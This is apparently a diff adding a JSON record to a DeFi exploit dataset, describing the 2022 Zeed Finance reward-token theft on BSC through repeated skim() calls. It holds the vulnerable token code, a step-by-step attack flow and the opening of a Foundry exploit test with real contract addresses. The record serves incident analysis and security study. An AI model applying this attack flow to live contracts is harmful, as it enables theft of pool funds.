@@ -1,0 +1,33 @@
+{
+ "id": "2022__2022-04-21_Zeed_SkimRewardManipulation",
+ "source_file": "2022/2022-04-21_Zeed_SkimRewardManipulation.md",
+ "title": "Zeed Finance — Reward Token Theft via Repeated skim() Calls",
+ "date": "2022-04-21",
+ "protocol": "Zeed Finance",
+ "chain": "BSC",
+ "loss_raw": "~$1,000,000 (YEED, USDT)",
+ "loss_usd": 1000000.0,
+ "root_cause": "The automatic reward mechanism on YEED token transfers deposits additional YEED into the LP pool, allowing an attacker to repeatedly call `skim()` to drain the excess",
+ "attack_tx": "Block 17,132,514",
+ "vulnerable_contract": "USDT-YEED-HoSwap Pair 0x33d5e574Bd1EBf3Ceb693319C2e276DaBE388399",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "❌ Automatically distributes reward tokens to pools on every transfer\n        uint256 reward = amount * rewardRate / 100_000;\n        for (uint i = 0; i < pools.length; i++) {\n            // Directly send reward to pool\n            _balances[pools[i]] += reward / pools.length;\n        }\n        // This causes pool's actual balance > reserve\n        _balances[msg.sender] -= amount;\n        _balances[to] += amount - reward;\n        return true;\n    }\n}\n\n// Attack: repeated skim() calls\n// Uniswap V2 skim():\n// function skim(address to) external {\n//     uint excess0 = IERC20(token0).balanceOf(address(this)) - reserve0;\n//     uint excess1 = IERC20(token1).balanceOf(address(this)) - reserve1;\n//     if (excess0 > 0) token0.transfer(to, excess0);\n//     if (excess1 > 0) token1.transfer(to, excess1);\n// }\n//",
+  "❌ After each skim, the transfer reward creates excess again → infinite loop possible\n\n//",
+  "// ❌ Root cause: The automatic reward mechanism on YEED token transfers deposits additional YEED into the LP pool, allowing an attacker to repeatedly call `skim()` to drain the excess\n    function skim(address arg0) external {}  // 0xbc25cf77  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Correct pattern\n// Accumulate rewards in a separate reward contract instead of directly transferring to pool addresses\n// Or force an automatic sync after skim to immediately update reserves"
+ ],
+ "steps": [
+  "⚡ YEED transfer reward → additional YEED added to each pool",
+  "[3] Accumulated YEED → swap to USDT",
+  "swapExactTokensForTokens(YEED → USDT)"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Flash swap: borrow large amount of YEED (USDT-YEED-HoSwap Pair)\n    │\n    ├─[2] [Inside callback] repeated skim loop (10 times)\n    │       for i in range(10):\n    │           │\n    │           ├─ transfer YEED to USDT-YEED Pair\n    │           │       ⚡ YEED transfer reward → additional YEED added to each pool\n    │           │\n    │           ├─ USDT-YEED Pair.skim(address(this))\n    │           │       collect excess YEED\n    │           │\n    │           ├─ HO-YEED Pair.skim(address(this))\n    │           │       collect excess YEED\n    │           │\n    │           └─ ZEED-YEED Pair.skim(address(this))\n    │                   collect excess YEED\n    │\n    ├─[3] Accumulated YEED → swap to USDT\n    │       swapExactTokensForTokens(YEED → USDT)\n    │\n    ├─[4] Re",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IPancakePair {\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\ninterface IPancakeRouter {\n    function swapExactTokensForTokens(\n        uint amountIn, uint amountOutMin,\n        address[] calldata path, address to, uint deadline\n    ) external returns (uint[] memory);\n}\n\ncontract ContractTest is Test {\n    IERC20 YEED = IERC20(0xe7748FCe1D1e2f2Fd2dDdB5074bD074745dDa8Ea);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IPancakeRouter router = IPancakeRouter(0x6CD71A07E72C514f5d511651F6808c639535396"
+ ]
+}
